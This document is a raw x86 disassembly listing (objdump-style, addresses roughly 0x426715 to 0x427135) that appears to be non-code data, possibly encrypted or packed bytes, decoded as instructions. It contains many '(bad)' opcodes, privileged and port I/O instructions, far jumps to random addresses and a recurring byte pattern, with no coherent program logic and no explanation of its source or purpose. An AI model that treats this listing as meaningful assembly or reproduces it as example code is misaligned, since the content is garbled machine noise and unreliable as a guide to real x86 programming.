  426715:	sub    esp,DWORD PTR [ebp-0x4c4091f]
  42671b:	pop    esp
  42671c:	pop    esp
  42671d:	fiadd  DWORD PTR [eax+0x62]
  426720:	inc    esi
  426721:	and    ecx,ecx
  426723:	mov    ds:0xcdcb6b4c,al
  426728:	jecxz  0x426721
  42672a:	div    DWORD PTR [ebx-0x2d]
  42672d:	jno    0x4266f6
  42672f:	jecxz  0x4266fd
  426731:	inc    edi
  426732:	cli    
  426733:	int    0x8c
	...
  426795:	add    BYTE PTR [eax-0xd53173],bh
  42679b:	imul   edi,esp,0xffffff9f
  42679e:	sbb    esp,eax
  4267a0:	leave  
  4267a1:	dec    ebx
  4267a2:	inc    ecx
  4267a3:	and    al,0x43
  4267a5:	bound  edx,QWORD PTR [edi-0x66]
  4267a8:	add    DWORD PTR [eax],eax
  4267aa:	pop    es
  4267ab:	add    DWORD PTR [eax],eax
  4267ad:	add    BYTE PTR [ebx+eax*8+0x193f4de5],al
  4267b4:	add    eax,0x2e2a81c0
  4267b9:	or     eax,0xb6b21b9f
  4267be:	mov    edx,0xbf6dbe11
  4267c3:	sbb    eax,0xbea5e40b
  4267c8:	div    ecx
  4267ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4267cc:	inc    eax
  4267cd:	push   esi
  4267ce:	add    BYTE PTR [esi-0x5950ba0e],bl
  4267d4:	and    al,0x98
  4267d6:	mov    fs,WORD PTR [eax]
  4267d8:	shr    eax,cl
  4267da:	sub    DWORD PTR [ecx-0x5e791ccb],ebx
  4267e0:	stc    
  4267e1:	or     bl,BYTE PTR ds:0xb35f366e
  4267e7:	inc    ecx
  4267e8:	jo     0x42677d
  4267ea:	aas    
  4267eb:	sbb    cl,BYTE PTR [edx]
  4267ed:	pop    ss
  4267ee:	stc    
  4267ef:	pop    esi
  4267f0:	dec    edx
  4267f1:	xchg   edi,eax
  4267f2:	loope  0x42681c
  4267f4:	icebp  
  4267f5:	(bad)  
  4267f6:	je     0x42679d
  4267f8:	dec    esp
  4267f9:	popa   
  4267fa:	fnsave [edx+0x10]
  4267fd:	xchg   ebx,eax
  4267fe:	sbb    edx,esi
  426800:	sub    al,al
  426802:	pop    ss
  426803:	xor    cl,dl
  426805:	inc    esp
  426806:	add    BYTE PTR [esp+ebp*8+0x6b],ah
  42680a:	(bad)  
  42680b:	xchg   edx,eax
  42680c:	sbb    al,0x5f
  42680e:	dec    edi
  42680f:	lahf   
  426810:	shl    ebp,1
  426812:	mov    ah,0x9a
  426814:	pop    ecx
  426815:	(bad)  
  426816:	adc    ch,BYTE PTR [ebx+0x6b]
  426819:	and    DWORD PTR [ebp-0x34],0x14
  42681d:	cli    
  42681e:	in     eax,dx
  42681f:	fistp  WORD PTR [eax]
  426821:	scas   eax,DWORD PTR es:[edi]
  426822:	push   es
  426823:	jmp    0x8cf389bd
  426828:	test   al,0xdd
  42682a:	adc    dh,ah
  42682c:	xchg   edx,eax
  42682d:	fisttp QWORD PTR [edi]
  42682f:	scas   eax,DWORD PTR es:[edi]
  426830:	(bad)  
  426831:	stos   BYTE PTR es:[edi],al
  426832:	imul   ebx,eax,0xffffffdf
  426835:	inc    edx
  426836:	jo     0x4267e2
  426838:	add    esi,ebx
  42683a:	stos   BYTE PTR es:[edi],al
  42683b:	hlt    
  42683c:	push   ds
  42683d:	push   esp
  42683e:	sti    
  42683f:	push   edi
  426840:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426841:	jmp    0x42685f
  426843:	imul   cl
  426845:	call   0x9562:0x2a0decd8
  42684c:	pop    esp
  42684d:	pusha  
  42684e:	lock (bad) 
  426850:	gs or  eax,0xd909b905
  426856:	xor    DWORD PTR [ebx+0x7342c745],edi
  42685c:	(bad)  
  42685e:	mov    DWORD PTR [edi],ebx
  426860:	fsubr  QWORD PTR [ebx-0x66]
  426863:	inc    ecx
  426864:	pop    ds
  426865:	push   eax
  426866:	fcompp 
  426868:	retf   
  426869:	mov    bl,0x8a
  42686b:	mov    esi,0x1f84aea8
  426870:	lock in al,dx
  426872:	cli    
  426873:	and    eax,0xddd0a5c7
  426878:	iret   
  426879:	je     0x426825
  42687b:	jne    0x426873
  42687d:	in     al,0x8c
  42687f:	rol    DWORD PTR [ebx],1
  426881:	push   cs
  426882:	pop    es
  426883:	sub    al,BYTE PTR [edi+0x38]
  426886:	jle    0x426821
  426888:	es test DWORD PTR es:[ecx-0x3fea1b45],ebp
  426890:	pop    ebp
  426891:	push   esi
  426892:	xchg   esp,eax
  426893:	stos   BYTE PTR es:[edi],al
  426894:	stc    
  426895:	xchg   esp,eax
  426896:	out    dx,eax
  426897:	sbb    bh,bl
  426899:	in     eax,0x7
  42689b:	lea    ebp,[eax+eax*8]
  42689e:	into   
  42689f:	push   0x73
  4268a1:	sbb    esi,DWORD PTR [ebp+0xf3d5693]
  4268a7:	mov    cl,0xc9
  4268a9:	enter  0x85ee,0x88
  4268ad:	or     al,0x94
  4268af:	inc    esp
  4268b0:	(bad)  
  4268b2:	das    
  4268b3:	cmc    
  4268b4:	and    al,BYTE PTR [eax]
	...
  426916:	mov    WORD PTR [esi+0x7d],cs
  426919:	jge    0x42691a
  42691b:	jg     0x4268a9
  42691d:	jmp    FWORD PTR [esi]
  42691f:	out    0xa0,eax
  426921:	stos   DWORD PTR es:[edi],eax
  426922:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426923:	or     bh,0x48
  426926:	pop    esi
  426927:	fwait
  426928:	add    DWORD PTR [eax],eax
  42692a:	pop    es
  42692b:	add    DWORD PTR [eax],eax
  42692d:	add    BYTE PTR [eax],bl
  42692f:	jecxz  0x426940
  426931:	push   0xa930f8b1
  426936:	ja     0x42696a
  426938:	mov    eax,ds:0x1b4a5f4c
  42693d:	jmp    0x4269b8
  42693f:	push   esp
  426940:	mov    ebp,0xc78004bc
  426945:	shl    ecx,cl
  426947:	mov    dl,0x9f
  426949:	push   eax
  42694a:	adc    DWORD PTR [eax],0x21
  42694d:	aad    0xc8
  42694f:	push   0xffffff88
  426951:	mov    edi,DWORD PTR [ebp-0x186c169a]
  426957:	fs gs cld 
  42695a:	adc    ebp,DWORD PTR [esi-0x67]
  42695d:	jo     0x42693f
  42695f:	ret    
  426960:	and    DWORD PTR [esi-0x3d],edx
  426963:	loope  0x4268f6
  426965:	jno    0x4269aa
  426967:	cwde   
  426968:	lods   eax,DWORD PTR ds:[esi]
  426969:	mov    dh,0x25
  42696b:	xchg   ebx,eax
  42696c:	add    BYTE PTR [edx+0x79],bh
  42696f:	div    BYTE PTR [ebx]
  426971:	jne    0x4269ab
  426973:	jno    0x4269b5
  426975:	mov    ebx,0x6ebc5ee4
  42697a:	inc    edi
  42697b:	ret    
  42697c:	adc    ecx,DWORD PTR [esi-0x1574c97f]
  426982:	test   dh,0x9c
  426985:	in     al,dx
  426986:	jno    0x426976
  426988:	ja     0x426912
  42698a:	loopne 0x426994
  42698c:	mov    ebp,0x2fa99d70
  426991:	dec    esp
  426992:	inc    esp
  426993:	and    ah,BYTE PTR [edi+0x24]
  426996:	cmp    eax,0x5c11efac
  42699b:	aaa    
  42699c:	cld    
  42699d:	dec    eax
  42699e:	mov    eax,0xefb3a56e
  4269a3:	les    eax,FWORD PTR [edi]
  4269a5:	mov    al,BYTE PTR [eax+0x1a]
  4269a8:	dec    ebp
  4269a9:	fild   WORD PTR [ebx]
  4269ab:	lock daa 
  4269ad:	adc    ch,bl
  4269af:	rcl    DWORD PTR [edx-0x16],cl
  4269b2:	inc    edi
  4269b3:	push   edx
  4269b4:	mov    ds,WORD PTR [edx]
  4269b6:	(bad)  
  4269b7:	pop    edi
  4269b8:	pop    ss
  4269b9:	push   ds
  4269ba:	dec    esp
  4269bb:	mov    esi,0xdbfbd35a
  4269c0:	sub    BYTE PTR [ebx-0x68cdba84],dh
  4269c6:	jo     0x4269eb
  4269c8:	iret   
  4269c9:	xchg   ecx,eax
  4269ca:	add    DWORD PTR [edx+0x4a],edx
  4269cd:	mov    al,0x38
  4269cf:	jb     0x426a3b
  4269d1:	sub    BYTE PTR [eax],dl
  4269d3:	sub    al,0xff
  4269d5:	cdq    
  4269d6:	pop    ds
  4269d7:	mov    WORD PTR [ebp+0x2],cs
  4269da:	aad    0x85
  4269dc:	(bad)  
  4269dd:	adc    BYTE PTR [ebp-0x635ae44a],bh
  4269e3:	sub    al,0xcc
  4269e5:	cmp    edx,DWORD PTR [ebp+eax*8-0x3c99bb0b]
  4269ec:	in     eax,0x7d
  4269ee:	adc    dh,BYTE PTR [ebx]
  4269f0:	lds    esi,FWORD PTR [ecx+0x50]
  4269f3:	push   edx
  4269f4:	mov    bl,0xf8
  4269f6:	mov    dh,0xa9
  4269f8:	sub    DWORD PTR [eax-0x6f0d36ca],esi
  4269fe:	cwde   
  4269ff:	xor    ch,BYTE PTR [esi+edi*8]
  426a02:	or     esi,DWORD PTR [edi+0x27e9a5c1]
  426a08:	and    eax,0xff031909
  426a0d:	out    dx,al
  426a0e:	addr16 xor eax,0xc7706b04
  426a14:	cmp    DWORD PTR [edi+edx*4+0x4ecc7a8b],ebp
  426a1b:	out    0x89,al
  426a1d:	or     eax,0xb7bf94ce
  426a22:	cmc    
  426a23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426a25:	cld    
  426a26:	and    al,0xe3
  426a28:	push   edi
  426a29:	shl    BYTE PTR ds:0xa63f87c7,cl
  426a2f:	pop    eax
  426a30:	std    
  426a31:	loope  0x4269c8
  426a33:	mov    ecx,0x13
	...
  426a94:	add    BYTE PTR [eax],al
  426a96:	cdq    
  426a97:	sub    BYTE PTR ds:0xdb77bd56,cl
  426a9d:	out    dx,eax
  426a9e:	xor    dl,BYTE PTR [edi+eiz*4]
  426aa1:	cld    
  426aa2:	sti    
  426aa3:	outs   dx,DWORD PTR ds:[esi]
  426aa4:	icebp  
  426aa5:	jge    0x426b0c
  426aa7:	pushf  
  426aa8:	add    DWORD PTR [eax],eax
  426aaa:	pop    es
  426aab:	add    DWORD PTR [eax],eax
  426aad:	add    bl,bl
  426aaf:	aas    
  426ab0:	mov    DWORD PTR [edi],esi
  426ab2:	push   0x931c421b
  426ab7:	fnstenv [esi+ebp*2-0x64c3673c]
  426abe:	mov    ds:0x2d253863,al
  426ac3:	jmp    0x426b30
  426ac5:	xor    ah,BYTE PTR [eax+edx*1+0x2d48123d]
  426acc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426acd:	inc    ebp
  426ace:	jbe    0x426ab5
  426ad0:	push   esi
  426ad1:	sbb    al,ah
  426ad3:	lods   al,BYTE PTR ds:[esi]
  426ad4:	mov    bh,0x94
  426ad6:	jl     0x426b11
  426ad8:	dec    esp
  426ad9:	jb     0x426ad9
  426adb:	stos   BYTE PTR es:[edi],al
  426adc:	packsswb mm5,QWORD PTR [edx-0x3f]
  426ae0:	jb     0x426a93
  426ae2:	sub    DWORD PTR [eax],ebx
  426ae4:	pop    edx
  426ae5:	sbb    al,0x1a
  426ae7:	dec    eax
  426ae8:	inc    esi
  426ae9:	sti    
  426aea:	xor    DWORD PTR [ecx-0x44],edi
  426aed:	add    DWORD PTR [eax+0x4a68698e],ebp
  426af3:	xchg   ecx,eax
  426af4:	(bad)  
  426af6:	popa   
  426af7:	xor    BYTE PTR [ebp+0x34a79920],dh
  426afd:	popa   
  426afe:	std    
  426aff:	std    
  426b00:	(bad)  
  426b01:	mov    ds:0x4f927e05,al
  426b06:	test   al,0xa9
  426b08:	cld    
  426b09:	or     al,0xb1
  426b0b:	pop    esp
  426b0c:	xor    eax,0x37e33b1
  426b11:	mov    esi,DWORD PTR [esi+edx*8+0x58]
  426b15:	mov    WORD PTR [si-0x57f9],cs
  426b1a:	iret   
  426b1b:	out    dx,eax
  426b1c:	shl    bl,0xe4
  426b1f:	mov    cs,WORD PTR [edx]
  426b21:	mov    ebx,0x30e032bb
  426b26:	cmp    dl,cl
  426b28:	lds    esi,FWORD PTR [edx-0x5d441bae]
  426b2e:	pop    ds
  426b2f:	ins    BYTE PTR es:[edi],dx
  426b30:	adc    DWORD PTR [edx-0x762e838e],esp
  426b36:	sub    DWORD PTR [ebp+edi*4+0x4551d298],edx
  426b3d:	push   es
  426b3e:	jo     0x426ac7
  426b40:	jnp    0x426af2
  426b42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426b43:	mov    dh,0x1f
  426b45:	or     al,0x2d
  426b47:	rol    BYTE PTR [eax+0x3f],cl
  426b4a:	add    al,0x2
  426b4c:	dec    ebx
  426b4d:	sub    edx,ebp
  426b4f:	inc    esp
  426b50:	dec    eax
  426b51:	jecxz  0x426bb2
  426b53:	iret   
  426b54:	mov    esp,0x72dce111
  426b59:	fcomp  QWORD PTR [edi-0x19]
  426b5c:	jnp    0x426b39
  426b5e:	pop    ecx
  426b5f:	add    al,0x19
  426b61:	mov    cl,0x28
  426b63:	mov    bh,0xe9
  426b65:	and    DWORD PTR [edi],esi
  426b67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426b68:	fidivr DWORD PTR [edx-0x18282adc]
  426b6e:	fst    st(2)
  426b70:	and    dl,dh
  426b72:	dec    edi
  426b73:	ret    0x3879
  426b76:	fs xchg ebp,eax
  426b78:	retf   
  426b79:	xchg   edx,eax
  426b7a:	cwde   
  426b7b:	dec    eax
  426b7c:	sbb    DWORD PTR [edx-0x516d2527],edi
  426b82:	pushf  
  426b83:	and    eax,0x2c33b61
  426b88:	sub    BYTE PTR [edi-0x33],cl
  426b8b:	cld    
  426b8c:	shl    edi,1
  426b8e:	wrmsr  
  426b90:	add    al,0xae
  426b92:	pop    edi
  426b93:	adc    DWORD PTR [ebx],0xffffff81
  426b96:	cwde   
  426b97:	push   ds
  426b98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426b99:	or     al,0x6b
  426b9b:	in     al,dx
  426b9c:	dec    esi
  426b9d:	pop    edi
  426b9e:	dec    edi
  426b9f:	fisttp WORD PTR [esi]
  426ba1:	xlat   BYTE PTR fs:[ebx]
  426ba3:	add    eax,0xf4ba5dd8
  426ba8:	dec    edx
  426ba9:	fcomp  QWORD PTR [edx-0x65]
  426bac:	shl    BYTE PTR [edx+0x2aa79c18],1
  426bb2:	lahf   
  426bb3:	and    DWORD PTR [eax+0x0],ebx
	...
  426c15:	add    dl,ah
  426c17:	pusha  
  426c18:	test   DWORD PTR [esi+0x74f3f787],esi
  426c1e:	je     0x426c67
  426c20:	push   0xffffffb6
  426c22:	test   al,0xc0
  426c24:	pop    edi
  426c25:	enter  0x9d6c,0x1
  426c29:	add    BYTE PTR [edi],al
  426c2b:	add    DWORD PTR [eax],eax
  426c2d:	add    dh,ch
  426c2f:	push   0xffffffab
  426c31:	pop    es
  426c32:	add    BYTE PTR [edx],al
  426c34:	cmc    
  426c35:	pop    ecx
  426c36:	cmp    ch,BYTE PTR [esi-0x70]
  426c39:	cmp    ebx,ebx
  426c3b:	das    
  426c3c:	mov    ecx,0x17359b05
  426c41:	scas   al,BYTE PTR es:[edi]
  426c42:	mov    bh,0xa8
  426c44:	xchg   bl,cl
  426c46:	(bad)  
  426c47:	ret    0x6deb
  426c4a:	jge    0x426cb9
  426c4c:	arpl   WORD PTR [edx-0x39],bx
  426c4f:	leave  
  426c50:	jg     0x426cbb
  426c52:	in     al,dx
  426c53:	push   ds
  426c54:	mov    cl,0x76
  426c56:	aam    0xfa
  426c58:	mov    ebp,0xcfa7937c
  426c5d:	enter  0x87fb,0xde
  426c61:	and    ah,ch
  426c63:	push   eax
  426c64:	test   eax,0x3bf0076c
  426c69:	push   ds
  426c6a:	or     al,BYTE PTR [edx+0x11]
  426c6d:	push   edx
  426c6e:	push   eax
  426c6f:	or     ch,BYTE PTR [ebx]
  426c71:	inc    ecx
  426c72:	mov    ecx,0x8c009b8b
  426c77:	mov    ecx,0x88cf65b7
  426c7c:	pop    esi
  426c7d:	fdiv   QWORD PTR [bx+si-0x6b]
  426c81:	or     BYTE PTR [edi],dl
  426c83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426c84:	ret    
  426c85:	cmp    DWORD PTR [eax+0x3e64c5b0],edx
  426c8b:	iret   
  426c8c:	sahf   
  426c8d:	adc    edi,DWORD PTR [ecx-0x44fd6a8a]
  426c93:	jo     0x426c70
  426c95:	and    DWORD PTR [ecx-0xca1b6d3],ecx
  426c9b:	out    0x30,al
  426c9d:	fmulp  st(0),st
  426c9f:	fdiv   DWORD PTR [ebx]
  426ca1:	push   0xffffffa5
  426ca3:	dec    BYTE PTR [esi]
  426ca5:	inc    eax
  426ca6:	jl     0x426c93
  426ca8:	mov    eax,ds:0x3dadd5b1
  426cad:	cmp    ebx,edi
  426caf:	cmp    dh,ah
  426cb1:	jge    0x426c48
  426cb3:	stos   DWORD PTR es:[edi],eax
  426cb4:	push   ebx
  426cb5:	cmc    
  426cb6:	dec    ebx
  426cb7:	ja     0x426c50
  426cb9:	sub    BYTE PTR [ebx+ebx*8-0x79ddbdfb],dh
  426cc0:	mov    esp,0x38602418
  426cc5:	aam    0x9c
  426cc7:	mov    eax,0x8abc48aa
  426ccc:	call   0x9026254c
  426cd1:	xchg   edx,eax
  426cd2:	sub    ecx,DWORD PTR ds:0xbfc87561
  426cd8:	arpl   WORD PTR [ebx+0x57b2767],dx
  426cde:	cs int 0x60
  426ce1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426ce2:	mov    ah,BYTE PTR ds:0x31d2d2ff
  426ce8:	jl     0x426d42
  426cea:	cmp    bl,BYTE PTR [edi-0x453c2120]
  426cf0:	inc    ecx
  426cf1:	mov    eax,0xf205de0f
  426cf6:	xchg   ecx,eax
  426cf7:	mov    ebp,0xded88fd4
  426cfc:	push   esi
  426cfd:	jmp    0xc263eace
  426d02:	les    edx,FWORD PTR [ebx+0x46]
  426d05:	xchg   ebp,eax
  426d06:	mov    ds:0x7082b736,eax
  426d0b:	xor    al,0xdc
  426d0d:	and    al,0xdc
  426d0f:	mov    ds:0xee854c08,eax
  426d14:	(bad)  
  426d16:	scas   eax,DWORD PTR es:[edi]
  426d17:	int    0x7
  426d19:	(bad)  
  426d1a:	dec    ebx
  426d1b:	add    eax,0x51428dd9
  426d20:	and    ebp,DWORD PTR [esi+0xf638d6f]
  426d26:	cmp    al,BYTE PTR ds:0x3d05d90e
  426d2c:	xchg   edi,eax
  426d2d:	adc    BYTE PTR [ebx+0x5ad28cf4],0x60
  426d34:	push   eax
	...
  426d95:	add    BYTE PTR [edx],cl
  426d97:	mov    cl,0x61
  426d99:	repz sti 
  426d9b:	repz call 0x1987:0x7e1b1bf9
  426da3:	and    al,ch
  426da5:	inc    ebx
  426da6:	jae    0x426d46
  426da8:	add    DWORD PTR [eax],eax
  426daa:	pop    es
  426dab:	add    DWORD PTR [eax],eax
  426dad:	add    BYTE PTR [ecx-0x5f],al
  426db0:	jne    0x426da4
  426db2:	imul   eax,DWORD PTR [edx],0x142c5ea6
  426db8:	xchg   DWORD PTR [edi+ecx*4+0x22b10e4e],ebx
  426dbf:	das    
  426dc0:	pop    edi
  426dc1:	xchg   BYTE PTR [ecx+0x6c1f44e5],dl
  426dc7:	dec    eax
  426dc8:	jbe    0x426d9a
  426dca:	push   ebx
  426dcb:	push   es
  426dcc:	mov    al,0x10
  426dce:	and    bh,dh
  426dd0:	cmp    al,0x3b
  426dd2:	mov    WORD PTR [edx-0x52],cs
  426dd5:	and    edx,ebp
  426dd7:	add    al,0x64
  426dd9:	adc    ebx,DWORD PTR [edx-0x6c]
  426ddc:	sar    DWORD PTR [eax+esi*2-0xd],0xf
  426de1:	add    dh,BYTE PTR [eax-0x3]
  426de4:	push   0x63
  426de6:	ins    BYTE PTR es:[edi],dx
  426de7:	js     0x426dd9
  426de9:	xrelease xchg DWORD PTR [ebx+0x7bdb18b4],ebp
  426df0:	add    al,0x1a
  426df2:	cld    
  426df3:	popw   ds
  426df5:	pop    ss
  426df6:	xor    ebx,DWORD PTR [ebp+0x341acad4]
  426dfc:	sub    dl,bl
  426dfe:	xchg   esp,eax
  426dff:	hlt    
  426e00:	fadd   DWORD PTR [eax]
  426e02:	mov    dh,0x20
  426e04:	sub    BYTE PTR [ecx-0xa569920],ch
  426e0a:	xchg   ebx,eax
  426e0b:	hlt    
  426e0c:	aad    0x20
  426e0e:	shl    BYTE PTR [edx-0x14b87d8c],cl
  426e14:	xor    BYTE PTR [ebx+0x7b7d2116],0x51
  426e1b:	pop    edx
  426e1c:	jg     0x426e21
  426e1e:	and    BYTE PTR [esi],bh
  426e20:	pop    edi
  426e21:	and    ebx,DWORD PTR [ecx-0x56]
  426e24:	add    al,0xb0
  426e26:	jmp    0xa6c4eae1
  426e2b:	fdivr  st,st(7)
  426e2d:	aad    0x72
  426e2f:	xor    eax,0xd0aee6b
  426e34:	pop    es
  426e35:	das    
  426e36:	jae    0x426de9
  426e38:	inc    ebx
  426e39:	(bad)  
  426e3a:	pop    ebp
  426e3b:	sbb    ecx,esi
  426e3d:	pop    edi
  426e3e:	cmp    eax,0xc6c35c7c
  426e43:	mov    eax,0xf4328c5a
  426e48:	pop    esi
  426e49:	idiv   DWORD PTR [edx+0x8e240f8]
  426e4f:	pop    es
  426e50:	test   al,0xa5
  426e52:	and    BYTE PTR [esi-0x771986b6],0xa3
  426e59:	jmp    0x84b0:0x88acff65
  426e60:	sar    BYTE PTR [eax+ecx*2],cl
  426e63:	xchg   esp,eax
  426e64:	shl    BYTE PTR [edi-0x11c41d6a],0x7c
  426e6b:	inc    ecx
  426e6c:	enter  0x225e,0x12
  426e70:	fsubr  st,st(4)
  426e72:	adc    dh,BYTE PTR [ebx+eiz*4-0x693cf896]
  426e79:	mov    DWORD PTR [edi],esp
  426e7b:	inc    ecx
  426e7c:	cmp    cl,BYTE PTR [edx*8-0x7df6c8d5]
  426e83:	push   ebx
  426e84:	outs   dx,BYTE PTR ds:[esi]
  426e85:	dec    ebx
  426e86:	arpl   WORD PTR [ecx+0x67],dx
  426e89:	dec    ecx
  426e8a:	shl    BYTE PTR [edx],0xa9
  426e8d:	hlt    
  426e8e:	test   BYTE PTR [edx-0x5d],0x70
  426e92:	fld    TBYTE PTR [eax-0x51]
  426e95:	pop    ds
  426e96:	ja     0x426ee1
  426e98:	xchg   ebx,eax
  426e99:	add    bl,BYTE PTR [ebx-0x7b]
  426e9c:	mov    dl,0x7f
  426e9e:	sbb    BYTE PTR [ebp-0x62],ch
  426ea1:	retf   
  426ea2:	cdq    
  426ea3:	ds jl  0x426e79
  426ea6:	ja     0x426e67
  426ea8:	(bad)  
  426eaa:	cli    
  426eab:	sub    ebx,DWORD PTR [ecx+ebp*1+0x8e67a35]
  426eb2:	pop    ss
  426eb3:	inc    edx
  426eb4:	fiadd  WORD PTR [eax]
	...
  426f16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426f17:	mov    ds:0xf5c7f1c7,al
  426f1c:	mov    dh,0xf7
  426f1e:	pop    eax
  426f1f:	or     BYTE PTR [ecx-0x75a085c],ch
  426f25:	jne    0x426fa1
  426f27:	lahf   
  426f28:	add    DWORD PTR [eax],eax
  426f2a:	pop    es
  426f2b:	add    DWORD PTR [eax],eax
  426f2d:	add    BYTE PTR [ecx],cl
  426f2f:	xchg   ebx,eax
  426f30:	adc    eax,0xe67946c4
  426f35:	mov    ds:0xef616592,al
  426f3a:	mov    ds:0xc2f1bd19,eax
  426f3f:	push   0x3f
  426f41:	push   ds
  426f42:	je     0x426eef
  426f44:	(bad)  
  426f45:	loopne 0x426f12
  426f47:	es aaa 
  426f49:	sbb    bh,BYTE PTR [esi]
  426f4b:	mov    bh,0x2c
  426f4d:	(bad)  
  426f4e:	lahf   
  426f4f:	cld    
  426f50:	inc    esi
  426f51:	xchg   ch,bh
  426f53:	mov    BYTE PTR [ebx],dl
  426f55:	xchg   edi,eax
  426f56:	popf   
  426f57:	fs retf 
  426f59:	rcr    BYTE PTR [ebp-0x36],cl
  426f5c:	mov    eax,ds:0x23881cec
  426f61:	out    0x90,eax
  426f63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426f64:	test   dl,dl
  426f66:	arpl   WORD PTR [esi-0x75],sp
  426f69:	xchg   esi,eax
  426f6a:	push   ebp
  426f6b:	js     0x426f95
  426f6d:	mov    edi,0x6ee08b6e
  426f72:	sahf   
  426f73:	cmp    al,0xda
  426f75:	mul    DWORD PTR ds:0xcc036529
  426f7b:	gs inc ebp
  426f7d:	cwde   
  426f7e:	dec    esp
  426f7f:	in     al,dx
  426f80:	clc    
  426f81:	or     BYTE PTR [esi+0x7775284b],ah
  426f87:	mov    edx,0xb21a41fa
  426f8c:	shl    BYTE PTR [eax],1
  426f8e:	mov    WORD PTR [edx-0x74],ds
  426f91:	out    0x73,eax
  426f93:	test   DWORD PTR [edx-0x2dde26eb],edx
  426f99:	pop    edi
  426f9a:	jecxz  0x426f39
  426f9c:	mov    ah,0x22
  426f9e:	test   al,0x18
  426fa0:	ds mov eax,0x5adf417b
  426fa6:	lods   al,BYTE PTR ds:[esi]
  426fa7:	out    0x1,eax
  426fa9:	mov    bl,0x5c
  426fab:	cmp    bh,ch
  426fad:	sub    DWORD PTR [ecx+0x26],esp
  426fb0:	jp     0x426f8b
  426fb2:	loope  0x426f9c
  426fb4:	jo     0x426f64
  426fb6:	lods   al,BYTE PTR ds:[esi]
  426fb7:	out    dx,eax
  426fb8:	inc    edx
  426fb9:	shl    BYTE PTR [ebp-0x5620e07b],1
  426fbf:	jle    0x426f86
  426fc1:	pop    ss
  426fc2:	ss inc esi
  426fc4:	(bad)  [edx-0x15]
  426fc7:	mov    DWORD PTR [esi+0x27d39e7f],ecx
  426fcd:	les    edx,FWORD PTR [ebx]
  426fcf:	adc    BYTE PTR [edi],0x12
  426fd2:	sbb    al,0xdf
  426fd4:	imul   esi,DWORD PTR [ebx+0x20],0x5d
  426fd8:	jmp    0x6a11:0xb2c47a0b
  426fdf:	push   ebp
  426fe0:	loopne 0x427041
  426fe2:	outs   dx,BYTE PTR ds:[esi]
  426fe3:	div    DWORD PTR [esi+0x52]
  426fe6:	mov    bh,0xf
  426fe8:	mov    bl,0x87
  426fea:	push   eax
  426feb:	int3   
  426fec:	dec    esi
  426fed:	imul   ebx,DWORD PTR [esi-0x6c5812d5],0xd
  426ff4:	cmc    
  426ff5:	pushf  
  426ff6:	or     dl,bh
  426ff8:	inc    esp
  426ff9:	xchg   BYTE PTR [ecx-0x8],ah
  426ffc:	mov    ebx,0x25ab2859
  427001:	sbb    ch,dh
  427003:	lea    ecx,[eax]
  427005:	adc    eax,0xf8c38cb3
  42700a:	cmc    
  42700b:	or     BYTE PTR [esi-0x13],ah
  42700e:	inc    eax
  42700f:	pop    esi
  427010:	cwde   
  427011:	push   esp
  427012:	xor    DWORD PTR [ebp-0x56ce1c94],ecx
  427018:	add    dh,ah
  42701a:	pop    ecx
  42701b:	imul   esi,DWORD PTR [ecx-0x6e],0x7e
  42701f:	sub    BYTE PTR [ebx],0xdd
  427022:	adc    eax,0xcbf40d7
  427027:	or     al,0x88
  427029:	adc    al,0x30
  42702b:	das    
  42702c:	bound  esi,QWORD PTR [ecx]
  42702e:	cmp    BYTE PTR [ecx-0x18],dl
  427031:	add    bh,BYTE PTR [esi+0xc0c]
	...
  427093:	add    BYTE PTR [eax],al
  427095:	add    BYTE PTR [ebp*2-0x8846ae6],cl
  42709c:	(bad)  
  42709d:	std    
  42709e:	stos   DWORD PTR es:[edi],eax
  42709f:	sbb    DWORD PTR [eax+0x479fbec6],eax
  4270a5:	dec    edi
  4270a6:	and    DWORD PTR [eax+0x1070001],0xfa590000
  4270b0:	in     al,dx
  4270b1:	aas    
  4270b2:	mov    ah,0x96
  4270b4:	push   esp
  4270b5:	daa    
  4270b6:	add    DWORD PTR [ebp+0x3d],edx
  4270b9:	lods   al,BYTE PTR ds:[esi]
  4270ba:	aaa    
  4270bb:	or     eax,0xbc60632a
  4270c0:	nop
  4270c1:	jbe    0x427092
  4270c3:	in     eax,dx
  4270c4:	icebp  
  4270c5:	and    DWORD PTR [eax],edx
  4270c7:	mov    ebx,0x7a40ee3d
  4270cc:	shl    DWORD PTR [eax-0x41c43aa9],0x9b
  4270d3:	dec    ecx
  4270d4:	mov    ch,0x56
  4270d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4270d7:	push   ebp
  4270d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4270d9:	dec    eax
  4270da:	jmp    0xb13b3926
  4270df:	add    al,0x7a
  4270e1:	mov    dh,0xa3
  4270e3:	fist   WORD PTR [edi-0x2b2f172e]
  4270e9:	and    BYTE PTR [edx+0x2f7d7a09],cl
  4270ef:	and    BYTE PTR [edi+esi*8+0x397b84b7],bl
  4270f6:	es and ah,ah
  4270f9:	in     al,0x87
  4270fb:	addr16 dec ebx
  4270fd:	in     eax,0xa7
  4270ff:	inc    ebp
  427100:	popf   
  427101:	retf   0x1d86
  427104:	outs   dx,DWORD PTR gs:[esi]
  427106:	xchg   BYTE PTR [eax+0x51],ch
  427109:	in     eax,0xeb
  42710b:	lds    eax,FWORD PTR [ebp-0x36435fb0]
  427111:	cdq    
  427112:	or     ebx,DWORD PTR ds:0x6ad80d09
  427118:	ret    
  427119:	pop    ebx
  42711a:	cmc    
  42711b:	push   0xcc32866c
  427120:	push   es
  427121:	add    BYTE PTR [ebx],dh
  427123:	(bad)  
  427124:	mov    al,0x0
  427126:	test   eax,0x6a7b8655
  42712b:	xor    bl,BYTE PTR ds:0x53fa9780
  427131:	jle    0x427102
  427133:	aam    0x79
  427135:	cs xor al,0xc7
